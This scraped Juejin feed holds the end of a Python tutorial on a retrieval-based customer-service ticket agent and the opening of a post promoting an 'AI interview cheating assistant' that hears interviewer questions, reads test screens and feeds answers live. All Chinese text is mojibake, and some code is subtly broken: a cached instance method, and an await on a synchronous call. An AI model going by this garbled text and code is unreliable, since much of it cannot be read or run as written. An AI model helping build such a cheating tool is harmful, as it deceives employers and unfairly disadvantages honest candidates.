        <span class="hljs-string">"å¿˜è®°å¯†ç æ€ä¹ˆåŠï¼Ÿ"</span>,
        <span class="hljs-string">"ç¬”è®°æœ¬ç”µè„‘å¯ä»¥å‡çº§å†…å­˜å—ï¼Ÿ"</span>
    ]
    
    <span class="hljs-keyword">for</span> question <span class="hljs-keyword">in</span> questions:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\n<span class="hljs-subst">{<span class="hljs-string">'='</span>*<span class="hljs-number">60</span>}</span>"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"é—®é¢˜: <span class="hljs-subst">{question}</span>"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">'='</span>*<span class="hljs-number">60</span>)
        
        result = agent.ask(question)
        
        <span class="hljs-keyword">if</span> result[<span class="hljs-string">'code'</span>] == <span class="hljs-number">0</span>:
            data = result[<span class="hljs-string">'data'</span>]
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\nç­”æ¡ˆ:\n<span class="hljs-subst">{data[<span class="hljs-string">'answer'</span>]}</span>"</span>)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\nå‚è€ƒå·¥å•: <span class="hljs-subst">{<span class="hljs-built_in">len</span>(data[<span class="hljs-string">'sources'</span>])}</span>æ¡"</span>)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å¤„ç†æ—¶é—´: <span class="hljs-subst">{data[<span class="hljs-string">'metadata'</span>][<span class="hljs-string">'query_time'</span>]}</span>ç§’"</span>)
        <span class="hljs-keyword">else</span>:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"é”™è¯¯: <span class="hljs-subst">{result[<span class="hljs-string">'msg'</span>]}</span>"</span>)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    test_qa()
</code></pre>
<hr/>
<h3 data-id="heading-17">å…­ã€æµå¼é—®ç­”</h3>
<h4 data-id="heading-18">6.1 æµå¼å®ç°</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ServiceTicketAgent</span>:
    <span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">ask_stream</span>(<span class="hljs-params">self, question: <span class="hljs-built_in">str</span></span>):
        <span class="hljs-string">"""
        æµå¼é—®ç­”ï¼Œé€tokenè¿”å›ç­”æ¡ˆ
        
        Yields:
            dict: æµå¼äº‹ä»¶
            {
                "type": "thinking" | "sources" | "token" | "done" | "error",
                "data": {...}
            }
        """</span>
        start_time = time.time()
        
        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># 1. å‘é€æ€è€ƒçŠ¶æ€</span>
            <span class="hljs-keyword">yield</span> {
                <span class="hljs-string">"type"</span>: <span class="hljs-string">"thinking"</span>,
                <span class="hljs-string">"data"</span>: {<span class="hljs-string">"status"</span>: <span class="hljs-string">"retrieving"</span>, <span class="hljs-string">"message"</span>: <span class="hljs-string">"æ­£åœ¨æ£€ç´¢ç›¸å…³å·¥å•..."</span>}
            }
            
            <span class="hljs-comment"># 2. æ£€ç´¢ç›¸å…³å·¥å•</span>
            source_docs = self._search_similar_documents(question)
            
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> source_docs:
                <span class="hljs-keyword">yield</span> {
                    <span class="hljs-string">"type"</span>: <span class="hljs-string">"error"</span>,
                    <span class="hljs-string">"data"</span>: {<span class="hljs-string">"code"</span>: <span class="hljs-number">2001</span>, <span class="hljs-string">"msg"</span>: <span class="hljs-string">"æœªæ‰¾åˆ°ç›¸å…³å·¥å•è®°å½•"</span>}
                }
                <span class="hljs-keyword">return</span>
            
            <span class="hljs-comment"># 3. å‘é€æ£€ç´¢ç»“æœ</span>
            sources = []
            <span class="hljs-keyword">for</span> doc <span class="hljs-keyword">in</span> source_docs:
                metadata = doc.metadata
                sources.append({
                    <span class="hljs-string">"ticket_id"</span>: metadata.get(<span class="hljs-string">'ticket_id'</span>, <span class="hljs-string">'Unknown'</span>),
                    <span class="hljs-string">"issue_type"</span>: metadata.get(<span class="hljs-string">'issue_type'</span>, <span class="hljs-string">'Unknown'</span>),
                    <span class="hljs-string">"priority"</span>: metadata.get(<span class="hljs-string">'priority'</span>, <span class="hljs-string">'Unknown'</span>),
                    <span class="hljs-string">"score"</span>: <span class="hljs-number">1</span> - metadata.get(<span class="hljs-string">'distance'</span>, <span class="hljs-number">0</span>)
                })
            
            <span class="hljs-keyword">yield</span> {
                <span class="hljs-string">"type"</span>: <span class="hljs-string">"sources"</span>,
                <span class="hljs-string">"data"</span>: {<span class="hljs-string">"sources"</span>: sources[:<span class="hljs-number">5</span>], <span class="hljs-string">"count"</span>: <span class="hljs-built_in">len</span>(source_docs)}
            }
            
            <span class="hljs-comment"># 4. å‘é€ç”ŸæˆçŠ¶æ€</span>
            <span class="hljs-keyword">yield</span> {
                <span class="hljs-string">"type"</span>: <span class="hljs-string">"thinking"</span>,
                <span class="hljs-string">"data"</span>: {<span class="hljs-string">"status"</span>: <span class="hljs-string">"generating"</span>, <span class="hljs-string">"message"</span>: <span class="hljs-string">"æ­£åœ¨ç”Ÿæˆè§£å†³æ–¹æ¡ˆ..."</span>}
            }
            
            <span class="hljs-comment"># 5. è®¾ç½®é—®ç­”é“¾</span>
            qa_chain = self._setup_qa_chain()
            
            <span class="hljs-comment"># 6. æµå¼æ‰§è¡Œé—®ç­”</span>
            full_answer = <span class="hljs-string">""</span>
            <span class="hljs-keyword">async</span> <span class="hljs-keyword">for</span> chunk <span class="hljs-keyword">in</span> qa_chain.astream(question):
                token = <span class="hljs-built_in">str</span>(chunk) <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(chunk, <span class="hljs-built_in">str</span>) <span class="hljs-keyword">else</span> chunk
                full_answer += token
                
                <span class="hljs-comment"># å‘é€token</span>
                <span class="hljs-keyword">yield</span> {
                    <span class="hljs-string">"type"</span>: <span class="hljs-string">"token"</span>,
                    <span class="hljs-string">"data"</span>: {<span class="hljs-string">"token"</span>: token}
                }
            
            <span class="hljs-comment"># 7. å‘é€å®Œæˆäº‹ä»¶</span>
            query_time = <span class="hljs-built_in">round</span>(time.time() - start_time, <span class="hljs-number">2</span>)
            
            <span class="hljs-keyword">yield</span> {
                <span class="hljs-string">"type"</span>: <span class="hljs-string">"done"</span>,
                <span class="hljs-string">"data"</span>: {
                    <span class="hljs-string">"answer"</span>: full_answer,
                    <span class="hljs-string">"metadata"</span>: {
                        <span class="hljs-string">"query_time"</span>: query_time,
                        <span class="hljs-string">"retrieved_docs"</span>: <span class="hljs-built_in">len</span>(source_docs),
                        <span class="hljs-string">"model"</span>: self.chat_model
                    }
                }
            }
            
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            <span class="hljs-keyword">yield</span> {
                <span class="hljs-string">"type"</span>: <span class="hljs-string">"error"</span>,
                <span class="hljs-string">"data"</span>: {<span class="hljs-string">"code"</span>: <span class="hljs-number">2000</span>, <span class="hljs-string">"msg"</span>: <span class="hljs-string">"AgentæœåŠ¡é”™è¯¯"</span>, <span class="hljs-string">"error_detail"</span>: <span class="hljs-built_in">str</span>(e)}
            }
</code></pre>
<h4 data-id="heading-19">6.2 æµ‹è¯•æµå¼é—®ç­”</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># test_stream.py</span>
<span class="hljs-keyword">import</span> asyncio

<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_stream</span>():
    agent = ServiceTicketAgent()
    question = <span class="hljs-string">"ç‰©æµä¿¡æ¯5å¤©æ²¡æ›´æ–°ï¼Œæ€ä¹ˆå¤„ç†ï¼Ÿ"</span>
    
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"é—®é¢˜: <span class="hljs-subst">{question}</span>\n"</span>)
    
    <span class="hljs-keyword">async</span> <span class="hljs-keyword">for</span> event <span class="hljs-keyword">in</span> agent.ask_stream(question):
        event_type = event[<span class="hljs-string">'type'</span>]
        data = event[<span class="hljs-string">'data'</span>]
        
        <span class="hljs-keyword">if</span> event_type == <span class="hljs-string">'thinking'</span>:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"ğŸ’­ <span class="hljs-subst">{data[<span class="hljs-string">'message'</span>]}</span>"</span>)
        
        <span class="hljs-keyword">elif</span> event_type == <span class="hljs-string">'sources'</span>:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"ğŸ“š æ£€ç´¢åˆ° <span class="hljs-subst">{data[<span class="hljs-string">'count'</span>]}</span> æ¡ç›¸å…³å·¥å•"</span>)
            <span class="hljs-keyword">for</span> i, source <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(data[<span class="hljs-string">'sources'</span>], <span class="hljs-number">1</span>):
                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"   <span class="hljs-subst">{i}</span>. <span class="hljs-subst">{source[<span class="hljs-string">'ticket_id'</span>]}</span> - <span class="hljs-subst">{source[<span class="hljs-string">'issue_type'</span>]}</span>"</span>)
        
        <span class="hljs-keyword">elif</span> event_type == <span class="hljs-string">'token'</span>:
            <span class="hljs-built_in">print</span>(data[<span class="hljs-string">'token'</span>], end=<span class="hljs-string">''</span>, flush=<span class="hljs-literal">True</span>)
        
        <span class="hljs-keyword">elif</span> event_type == <span class="hljs-string">'done'</span>:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\n\nâ±ï¸ å¤„ç†æ—¶é—´: <span class="hljs-subst">{data[<span class="hljs-string">'metadata'</span>][<span class="hljs-string">'query_time'</span>]}</span>ç§’"</span>)
        
        <span class="hljs-keyword">elif</span> event_type == <span class="hljs-string">'error'</span>:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"âŒ é”™è¯¯: <span class="hljs-subst">{data[<span class="hljs-string">'msg'</span>]}</span>"</span>)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    asyncio.run(test_stream())
</code></pre>
<hr/>
<h3 data-id="heading-20">ä¸ƒã€å“åº”æ ¼å¼è®¾è®¡</h3>
<h4 data-id="heading-21">7.1 ç»Ÿä¸€å“åº”æ ¼å¼</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># agent/response.py</span>
<span class="hljs-keyword">from</span> enum <span class="hljs-keyword">import</span> IntEnum

<span class="hljs-keyword">class</span> <span class="hljs-title class_">AgentErrorCode</span>(<span class="hljs-title class_ inherited__">IntEnum</span>):
    <span class="hljs-string">"""Agenté”™è¯¯ç """</span>
    SUCCESS = <span class="hljs-number">0</span>
    QUESTION_FORMAT_ERROR = <span class="hljs-number">2001</span>
    RAG_RETRIEVAL_ERROR = <span class="hljs-number">2002</span>
    NO_RELEVANT_RESULTS = <span class="hljs-number">2003</span>
    LLM_CALL_ERROR = <span class="hljs-number">2004</span>
    AGENT_ERROR = <span class="hljs-number">2000</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">success_response</span>(<span class="hljs-params">answer: <span class="hljs-built_in">str</span>, sources: <span class="hljs-built_in">list</span>, metadata: <span class="hljs-built_in">dict</span></span>) -&gt; <span class="hljs-built_in">dict</span>:
    <span class="hljs-string">"""æˆåŠŸå“åº”"""</span>
    <span class="hljs-keyword">return</span> {
        <span class="hljs-string">"code"</span>: AgentErrorCode.SUCCESS,
        <span class="hljs-string">"msg"</span>: <span class="hljs-string">"success"</span>,
        <span class="hljs-string">"data"</span>: {
            <span class="hljs-string">"answer"</span>: answer,
            <span class="hljs-string">"sources"</span>: sources,
            <span class="hljs-string">"metadata"</span>: metadata
        }
    }

<span class="hljs-keyword">def</span> <span class="hljs-title function_">error_response</span>(<span class="hljs-params">code: <span class="hljs-built_in">int</span>, msg: <span class="hljs-built_in">str</span>, error_detail: <span class="hljs-built_in">str</span> = <span class="hljs-literal">None</span></span>) -&gt; <span class="hljs-built_in">dict</span>:
    <span class="hljs-string">"""é”™è¯¯å“åº”"""</span>
    response = {
        <span class="hljs-string">"code"</span>: code,
        <span class="hljs-string">"msg"</span>: msg,
        <span class="hljs-string">"data"</span>: <span class="hljs-literal">None</span>
    }
    <span class="hljs-keyword">if</span> error_detail:
        response[<span class="hljs-string">"error_detail"</span>] = error_detail
    <span class="hljs-keyword">return</span> response
</code></pre>
<hr/>
<h3 data-id="heading-22">å…«ã€æ€§èƒ½ä¼˜åŒ–</h3>
<h4 data-id="heading-23">8.1 ç¼“å­˜æ£€ç´¢ç»“æœ</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> lru_cache

<span class="hljs-keyword">class</span> <span class="hljs-title class_">ServiceTicketAgent</span>:
<span class="hljs-meta">    @lru_cache(<span class="hljs-params">maxsize=<span class="hljs-number">100</span></span>)</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_cached_search</span>(<span class="hljs-params">self, question: <span class="hljs-built_in">str</span>, k: <span class="hljs-built_in">int</span> = <span class="hljs-number">5</span></span>):
        <span class="hljs-string">"""ç¼“å­˜æ£€ç´¢ç»“æœ"""</span>
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">tuple</span>(self._search_similar_documents(question, k))
</code></pre>
<h4 data-id="heading-24">8.2 æ‰¹é‡é—®ç­”</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">batch_ask</span>(<span class="hljs-params">self, questions: <span class="hljs-type">List</span>[<span class="hljs-built_in">str</span>]</span>) -&gt; <span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>]:
    <span class="hljs-string">"""æ‰¹é‡é—®ç­”"""</span>
    tasks = [self.ask(q) <span class="hljs-keyword">for</span> q <span class="hljs-keyword">in</span> questions]
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> asyncio.gather(*tasks)
</code></pre>
<hr/>
<h3 data-id="heading-25">ä¹ã€è¯„ä¼°æŒ‡æ ‡</h3>
<h4 data-id="heading-26">9.1 æ£€ç´¢è´¨é‡è¯„ä¼°</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">evaluate_retrieval</span>(<span class="hljs-params">test_cases: <span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>]</span>):
    <span class="hljs-string">"""è¯„ä¼°æ£€ç´¢è´¨é‡"""</span>
    agent = ServiceTicketAgent()
    
    metrics = {
        <span class="hljs-string">"precision"</span>: [],
        <span class="hljs-string">"recall"</span>: [],
        <span class="hljs-string">"mrr"</span>: []  <span class="hljs-comment"># Mean Reciprocal Rank</span>
    }
    
    <span class="hljs-keyword">for</span> <span class="hljs-keyword">case</span> <span class="hljs-keyword">in</span> test_cases:
        question = <span class="hljs-keyword">case</span>[<span class="hljs-string">'question'</span>]
        expected_tickets = <span class="hljs-built_in">set</span>(<span class="hljs-keyword">case</span>[<span class="hljs-string">'expected_tickets'</span>])
        
        <span class="hljs-comment"># æ£€ç´¢</span>
        docs = agent._search_similar_documents(question, k=<span class="hljs-number">5</span>)
        retrieved_tickets = <span class="hljs-built_in">set</span>([doc.metadata[<span class="hljs-string">'ticket_id'</span>] <span class="hljs-keyword">for</span> doc <span class="hljs-keyword">in</span> docs])
        
        <span class="hljs-comment"># è®¡ç®—æŒ‡æ ‡</span>
        tp = <span class="hljs-built_in">len</span>(expected_tickets &amp; retrieved_tickets)
        precision = tp / <span class="hljs-built_in">len</span>(retrieved_tickets) <span class="hljs-keyword">if</span> retrieved_tickets <span class="hljs-keyword">else</span> <span class="hljs-number">0</span>
        recall = tp / <span class="hljs-built_in">len</span>(expected_tickets) <span class="hljs-keyword">if</span> expected_tickets <span class="hljs-keyword">else</span> <span class="hljs-number">0</span>
        
        metrics[<span class="hljs-string">'precision'</span>].append(precision)
        metrics[<span class="hljs-string">'recall'</span>].append(recall)
    
    <span class="hljs-comment"># å¹³å‡å€¼</span>
    <span class="hljs-keyword">return</span> {
        <span class="hljs-string">"avg_precision"</span>: <span class="hljs-built_in">sum</span>(metrics[<span class="hljs-string">'precision'</span>]) / <span class="hljs-built_in">len</span>(metrics[<span class="hljs-string">'precision'</span>]),
        <span class="hljs-string">"avg_recall"</span>: <span class="hljs-built_in">sum</span>(metrics[<span class="hljs-string">'recall'</span>]) / <span class="hljs-built_in">len</span>(metrics[<span class="hljs-string">'recall'</span>])
    }
</code></pre>
<hr/>
<h3 data-id="heading-27">åã€æ€»ç»“</h3>
<p>æœ¬æ–‡ä»‹ç»äº†å®¢æœå·¥å•ç³»ç»Ÿçš„RAGæ£€ç´¢å’Œé—®ç­”å®ç°ï¼š</p>
<p>âœ… <strong>å‘é‡æ£€ç´¢</strong> - Weaviateç›¸ä¼¼åº¦æœç´¢<br/>
âœ… <strong>Promptå·¥ç¨‹</strong> - åŠ¨æ€ç»„è£…ä¸Šä¸‹æ–‡<br/>
âœ… <strong>LCELé—®ç­”é“¾</strong> - ä¼˜é›…çš„é“¾å¼è°ƒç”¨<br/>
âœ… <strong>æµå¼é—®ç­”</strong> - å®æ—¶æ‰“å­—æœºæ•ˆæœ<br/>
âœ… <strong>å“åº”æ ¼å¼</strong> - ç»Ÿä¸€çš„é”™è¯¯å¤„ç†</p>
<p><strong>ä¸‹ä¸€ç¯‡é¢„å‘Šï¼š</strong> ã€Šå®¢æœå·¥å•ç³»ç»Ÿå®æˆ˜ï¼ˆä¸‰ï¼‰ï¼šå‰åç«¯é›†æˆä¸ç”Ÿäº§éƒ¨ç½²ã€‹</p>
<p>æˆ‘ä»¬å°†ä»‹ç»å¦‚ä½•å°†AgentæœåŠ¡é›†æˆåˆ°å®Œæ•´çš„å‰åç«¯ç³»ç»Ÿä¸­ï¼Œå¹¶éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒã€‚</p>
<hr/>
<p><strong>ä½œè€…ç®€ä»‹ï¼š</strong> èµ„æ·±å¼€å‘è€…ï¼Œåˆ›ä¸šè€…ã€‚ä¸“æ³¨äºè§†é¢‘é€šè®¯æŠ€æœ¯é¢†åŸŸã€‚å›½å†…é¦–æœ¬Flutterè‘—ä½œã€ŠFlutteræŠ€æœ¯å…¥é—¨ä¸å®æˆ˜ã€‹ä½œè€…,å¦è‘—æœ‰ã€ŠDartè¯­è¨€å®æˆ˜ã€‹åŠã€ŠWebRTCéŸ³è§†é¢‘å¼€å‘ã€‹ç­‰ä¹¦ç±ã€‚å¤šå¹´ä»äº‹è§†é¢‘ä¼šè®®ã€è¿œç¨‹æ•™è‚²ç­‰æŠ€æœ¯ç ”å‘ï¼Œå¯¹äºAndroidã€iOSä»¥åŠè·¨å¹³å°å¼€å‘æŠ€æœ¯æœ‰æ¯”è¾ƒæ·±å…¥çš„ç ”ç©¶å’Œåº”ç”¨ï¼Œä½œä¸ºä¸»è¦ç¨‹åºå‘˜å¼€å‘äº†å¤šä¸ªåº”ç”¨é¡¹ç›®ï¼Œæ¶‰åŠåŒ»ç–—ã€äº¤é€šã€é“¶è¡Œç­‰é¢†åŸŸã€‚</p>
<p><strong>å­¦ä¹ èµ„æ–™ï¼š</strong></p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fkangshaojun%2Fai-agent-framework" target="_blank" title="https://github.com/kangshaojun/ai-agent-framework" ref="nofollow noopener noreferrer">é¡¹ç›®åœ°å€</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fkangshaojun" target="_blank" title="https://github.com/kangshaojun" ref="nofollow noopener noreferrer">ä½œè€…GitHub</a></li>
</ul>
<p><strong>æ¬¢è¿äº¤æµï¼š</strong> å¦‚æœ‰é—®é¢˜æ¬¢è¿åœ¨è¯„è®ºåŒºè®¨è®º ğŸš€</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[3å¤©é€Ÿæˆ ä½¿ç”¨AIã€Šä»é›¶å¼€å‘ä¸€æ¬¾ AI é¢è¯•ä½œå¼ŠåŠ©æ‰‹ã€‹ä¸€]]></title>    <link>https://juejin.cn/post/7590213554797805603</link>    <guid>https://juejin.cn/post/7590213554797805603</guid>    <pubDate>2026-01-02T15:31:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590213554797805603" data-draft-id="7590071125398749224" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="3å¤©é€Ÿæˆ ä½¿ç”¨AIã€Šä»é›¶å¼€å‘ä¸€æ¬¾ AI é¢è¯•ä½œå¼ŠåŠ©æ‰‹ã€‹ä¸€"/> <meta itemprop="keywords" content="React.js,Next.js"/> <meta itemprop="datePublished" content="2026-01-02T15:31:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ— æ•Œæš´é¾™æˆ˜å£«é€šå…³å‰ç«¯"/> <meta itemprop="url" content="https://juejin.cn/user/3373747481880926"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            3å¤©é€Ÿæˆ ä½¿ç”¨AIã€Šä»é›¶å¼€å‘ä¸€æ¬¾ AI é¢è¯•ä½œå¼ŠåŠ©æ‰‹ã€‹ä¸€
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3373747481880926/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ— æ•Œæš´é¾™æˆ˜å£«é€šå…³å‰ç«¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T15:31:19.000Z" title="Fri Jan 02 2026 15:31:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€åˆ«ç„¦è™‘äº†ï¼Œå…ˆæŠŠâ€œå¤–æŒ‚â€åšå‡ºæ¥</h2>
<p>æœ€è¿‘æŠ€æœ¯åœˆå……æ»¡äº†â€œå‰ç«¯å·²æ­»â€ã€â€œAI å–ä»£ç¨‹åºå‘˜â€çš„è®ºè°ƒã€‚ç„¦è™‘æ˜¯çœŸå®çš„ï¼Œä½†å¤§éƒ¨åˆ†ç„¦è™‘æ¥è‡ªâ€œçœ‹åˆ«äººåšâ€ï¼Œè€Œä¸æ˜¯â€œè‡ªå·±åšâ€ã€‚</p>
<p>å½“ä½ çœŸæ­£åŠ¨æ‰‹ç”¨ AI å¼€å‘ä¸€ä¸ªå¤æ‚çš„<strong>å®æ—¶äº¤äº’äº§å“</strong>æ—¶ï¼Œä½ ä¼šå‘ç°ï¼šAI å¾ˆå¼ºï¼Œä½†æŸäº›ç»†èŠ‚éœ€è¦è°ƒè¯•å’ŒæŠŠæ§ã€‚</p>
<p>ç”¨AIï¼Œä¸‰å¤©ä» 0 å¼€å§‹æ‰“é€ ä¸€æ¬¾<strong>AI é¢è¯•ä½œå¼ŠåŠ©æ‰‹</strong>ã€‚ä¸æ˜¯ Demoï¼Œæ˜¯èƒ½å®æ—¶å¬æ‡‚é¢è¯•å®˜æé—®ã€èƒ½çœ‹æ‡‚ç¬”è¯•é¢˜å±å¹•ã€å¹¶å³æ—¶æ¨é€ç­”æ¡ˆçš„â€œç¡¬æ ¸å¤–æŒ‚â€ã€‚</p>
<p>è¿™ç¯‡æ–‡ç« ï¼Œå°±æ˜¯è¿™æ¬¡å‰ç«¯æ¶æ„çš„å®Œæ•´å¤ç›˜ã€‚</p>
